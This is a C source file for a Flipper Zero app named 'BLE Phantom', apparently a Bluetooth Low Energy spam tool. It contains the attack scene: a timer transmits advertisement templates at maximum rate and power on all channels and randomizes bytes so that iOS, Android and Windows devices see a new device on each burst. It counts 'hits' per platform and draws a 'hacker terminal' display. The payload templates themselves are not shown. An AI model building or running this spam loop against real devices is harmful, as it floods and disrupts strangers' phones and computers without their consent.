// Live attack scene — hacker terminal UI with waveform, counters, platform tags

#include "../ble_phantom.h"
#include <furi_hal_random.h>

// ─────────────────────────────────────────────────────────────────────────────
// View model
// ─────────────────────────────────────────────────────────────────────────────

typedef struct {
    uint8_t  tick;
    bool     paused;
    bool     bt_ok;
    uint32_t packets_sent;
    uint32_t ios_hits;
    uint32_t android_hits;
    uint32_t win_hits;
    char     device_name[24];
    char     platform[12];
    char     mode_name[24];
    char     speed_name[10];
    uint8_t  wave[8];           // 8-column waveform heights (0-8)
} AttackViewModel;

// ─────────────────────────────────────────────────────────────────────────────
// Advance to next template within mode range, returns template pointer
// ─────────────────────────────────────────────────────────────────────────────

static const PhantomTemplate* bp_next_template(BlePhantomApp* app) {
    uint8_t first = BP_MODE_RANGE[app->mode].first;
    uint8_t last  = BP_MODE_RANGE[app->mode].last;
    uint8_t span  = last - first + 1;

    if(app->mode == PhantomModeChaos) {
        // Random walk — xorshift32 for unpredictability
        app->chaos_seed ^= app->chaos_seed << 13;
        app->chaos_seed ^= app->chaos_seed >> 17;
        app->chaos_seed ^= app->chaos_seed << 5;
        app->template_idx = first + (app->chaos_seed % span);
    } else {
        app->template_idx++;
        if(app->template_idx > last || app->template_idx < first)
            app->template_idx = first;
    }

    return &BP_ALL_TEMPLATES[app->template_idx];
}

// ─────────────────────────────────────────────────────────────────────────────
// Transmit one advertisement burst — called every timer tick
// ─────────────────────────────────────────────────────────────────────────────

static void bp_transmit(BlePhantomApp* app) {
    const PhantomTemplate* tpl = bp_next_template(app);

    // Copy template → mutable buffer
    memcpy(app->adv_buf, tpl->data, tpl->data_len);

    // Randomize designated bytes so iOS/Android see a "new" device each burst
    if(tpl->rng_offset > 0 && tpl->rng_len > 0) {
        furi_hal_random_fill_buf(app->adv_buf + tpl->rng_offset, tpl->rng_len);
    }

    // Push new payload to BLE beacon (non-blocking, hardware handles TX timing)
    furi_hal_bt_extra_beacon_set_data(app->adv_buf, tpl->data_len);

    // Counters
    app->packets_sent++;
    if     (tpl->platform[0] == 'i') app->ios_hits++;
    else if(tpl->platform[0] == 'A') app->android_hits++;
    else if(tpl->platform[0] == 'W') app->win_hits++;

    // Propagate to view model
    with_view_model(app->attack_view, AttackViewModel* m, {
        m->tick++;
        m->packets_sent  = app->packets_sent;
        m->ios_hits      = app->ios_hits;
        m->android_hits  = app->android_hits;
        m->win_hits      = app->win_hits;
        strncpy(m->device_name, tpl->name, 23);
        strncpy(m->platform,    tpl->platform, 11);

        // Shift waveform left, insert new random bar height
        for(uint8_t i = 0; i < 7; i++) m->wave[i] = m->wave[i+1];
        m->wave[7] = 1 + (app->adv_buf[tpl->data_len - 1] % 8);
    }, true);
}

// ─────────────────────────────────────────────────────────────────────────────
// Timer callback
// ─────────────────────────────────────────────────────────────────────────────

static void attack_timer_cb(void* ctx) {
    BlePhantomApp* app = ctx;
    if(!app->paused) bp_transmit(app);
}

// ─────────────────────────────────────────────────────────────────────────────
// Draw — monochrome hacker terminal aesthetic
// ─────────────────────────────────────────────────────────────────────────────

static void attack_draw(Canvas* canvas, void* model) {
    AttackViewModel* m = model;
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);

    // ── Header bar ───────────────────────────────────────────────────────────
    canvas_draw_rbox(canvas, 0, 0, 128, 11, 2);
    canvas_set_color(canvas, ColorWhite);
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 2, 8, "BLE PHANTOM");

    // Blinking LIVE indicator
    if(!m->paused && (m->tick & 3)) {
        canvas_draw_box(canvas, 90, 2, 6, 7);      // solid block
        canvas_set_color(canvas, ColorBlack);
        canvas_draw_str(canvas, 91, 8, "!"); // inverted "!"
        canvas_set_color(canvas, ColorWhite);
    }
    if(m->paused)
        canvas_draw_str(canvas, 83, 8, "[PAUSE]");
    else
        canvas_draw_str(canvas, 99, 8, "LIVE");

    canvas_set_color(canvas, ColorBlack);

    // ── Platform + mode row ──────────────────────────────────────────────────
    canvas_set_font(canvas, FontSecondary);
    char row[48];
    snprintf(row, sizeof(row), "%s  PKT:%lu",
        m->mode_name, (unsigned long)m->packets_sent);
    canvas_draw_str(canvas, 2, 20, row);

    // ── Hit counters ─────────────────────────────────────────────────────────
    // Small tags: [iOS:XX] [AND:XX] [WIN:XX]
    char ios_s[10], and_s[10], win_s[10];
    snprintf(ios_s, sizeof(ios_s), "iOS:%lu", (unsigned long)m->ios_hits);
    snprintf(and_s, sizeof(and_s), "AND:%lu", (unsigned long)m->android_hits);
    snprintf(win_s, sizeof(win_s), "WIN:%lu", (unsigned long)m->win_hits);
    canvas_draw_str(canvas, 2,  30, ios_s);
    canvas_draw_str(canvas, 40, 30, and_s);
    canvas_draw_str(canvas, 78, 30, win_s);

    // ── Current device name (big, centered) ──────────────────────────────────
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 37, AlignCenter, AlignTop, m->device_name);

    // ── Waveform ─────────────────────────────────────────────────────────────
    // 8 columns, each up to 8px tall, bottom-anchored at y=55
    for(uint8_t c = 0; c < 8; c++) {
        uint8_t h = m->wave[c];
        uint8_t x = 2  + c * 10;
        uint8_t y = 55 - h;
        canvas_draw_box(canvas, x, y, 8, h);
    }
    // Baseline
    canvas_draw_line(canvas, 1, 56, 83, 56);

    // ── Speed indicator on right of waveform ─────────────────────────────────
    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 87, 49, "SPD:");
    canvas_draw_str(canvas, 87, 57, m->speed_name);

    // ── Bottom hint ───────────────────────────────────────────────────────────
    canvas_draw_line(canvas, 0, 58, 127, 58);
    canvas_draw_str(canvas, 0, 64, "[^v]spd [OK]pause [<]stop");
}

// ─────────────────────────────────────────────────────────────────────────────
// Input
// ─────────────────────────────────────────────────────────────────────────────

static bool attack_input(InputEvent* ev, void* ctx) {
    BlePhantomApp* app = ctx;
    if(ev->type != InputTypeShort) return false;

    if(ev->key == InputKeyBack) {
        view_dispatcher_send_custom_event(app->view_dispatcher, PhantomEventBack);
        return true;
    }
    if(ev->key == InputKeyOk) {
        app->paused = !app->paused;
        with_view_model(app->attack_view, AttackViewModel* m, {
            m->paused = app->paused;
        }, true);
        return true;
    }
    if(ev->key == InputKeyUp) {
        if(app->speed < PhantomSpeedInsane) {
            app->speed = (PhantomSpeed)(app->speed + 1);
            // Restart timer with new interval
            furi_timer_stop(app->timer);
            furi_timer_start(app->timer, bp_speed_ms(app->speed));
            with_view_model(app->attack_view, AttackViewModel* m, {
                strncpy(m->speed_name, bp_speed_name(app->speed), 9);
            }, true);
        }
        return true;
    }
    if(ev->key == InputKeyDown) {
        if(app->speed > PhantomSpeedSlow) {
            app->speed = (PhantomSpeed)(app->speed - 1);
            furi_timer_stop(app->timer);
            furi_timer_start(app->timer, bp_speed_ms(app->speed));
            with_view_model(app->attack_view, AttackViewModel* m, {
                strncpy(m->speed_name, bp_speed_name(app->speed), 9);
            }, true);
        }
        return true;
    }
    return false;
}

// ─────────────────────────────────────────────────────────────────────────────
// BLE extra beacon config — max power, all channels, non-connectable
// ─────────────────────────────────────────────────────────────────────────────

static const GapExtraBeaconConfig bp_beacon_cfg = {
    .min_adv_interval_ms = 20,
    .max_adv_interval_ms = 20,
    .tx_power            = GapAdvPowerLevel_6dBm,
    .adv_channel_map     = GapAdvChannelMapAll,
    .adv_type            = GapAdvTypeAdvNonconnInd,
};

// ─────────────────────────────────────────────────────────────────────────────
// Scene lifecycle
// ─────────────────────────────────────────────────────────────────────────────

void bp_scene_attack_on_enter(void* ctx) {
    BlePhantomApp* app = ctx;

    // Reset counters
    app->packets_sent = 0;
    app->ios_hits     = 0;
    app->android_hits = 0;
    app->win_hits     = 0;
    app->template_idx = BP_MODE_RANGE[app->mode].first;
    app->paused       = false;
    app->chaos_seed   = (uint32_t)furi_get_tick() | 0xDEAD0001;

    // Init view model
    with_view_model(app->attack_view, AttackViewModel* m, {
        memset(m, 0, sizeof(AttackViewModel));
        strncpy(m->mode_name,  bp_mode_name(app->mode),  23);
        strncpy(m->speed_name, bp_speed_name(app->speed), 9);
        strncpy(m->device_name, "INITIALIZING...", 23);
        strncpy(m->platform, "...", 11);
        m->bt_ok = true;
    }, false);

    // Configure BLE extra beacon
    bool ok = furi_hal_bt_extra_beacon_set_config(&bp_beacon_cfg);
    if(!ok) {
        // BT not ready — still show UI but mark failure
        with_view_model(app->attack_view, AttackViewModel* m, {
            m->bt_ok = false;
            strncpy(m->device_name, "BT INIT FAILED", 23);
        }, true);
    }

    // Prime the first payload so the beacon has data from the start
    const PhantomTemplate* first = &BP_ALL_TEMPLATES[app->template_idx];
    memcpy(app->adv_buf, first->data, first->data_len);
    furi_hal_bt_extra_beacon_set_data(app->adv_buf, first->data_len);
    furi_hal_bt_extra_beacon_start();

    // Set draw / input callbacks
    view_set_draw_callback(app->attack_view, attack_draw);
    view_set_input_callback(app->attack_view, attack_input);
    view_set_context(app->attack_view, app);

    // Start cycle timer
    app->timer = furi_timer_alloc(attack_timer_cb, FuriTimerTypePeriodic, app);
    furi_timer_start(app->timer, bp_speed_ms(app->speed));

    view_dispatcher_switch_to_view(app->view_dispatcher, PhantomViewAttack);

    // Vibrate once on launch
    notification_message(app->notifications, &sequence_single_vibro);
}

bool bp_scene_attack_on_event(void* ctx, SceneManagerEvent ev) {
    BlePhantomApp* app = ctx;
    if(ev.type == SceneManagerEventTypeCustom && ev.event == PhantomEventBack) {
        scene_manager_previous_scene(app->scene_manager);
        return true;
    }
    if(ev.type == SceneManagerEventTypeBack) {
        return false;
    }
    return false;
}

void bp_scene_attack_on_exit(void* ctx) {
    BlePhantomApp* app = ctx;

    // Stop and free timer
    if(app->timer) {
        furi_timer_stop(app->timer);
        furi_timer_free(app->timer);
        app->timer = NULL;
    }

    // Stop BLE extra beacon — restore normal BT state
    furi_hal_bt_extra_beacon_stop();
}
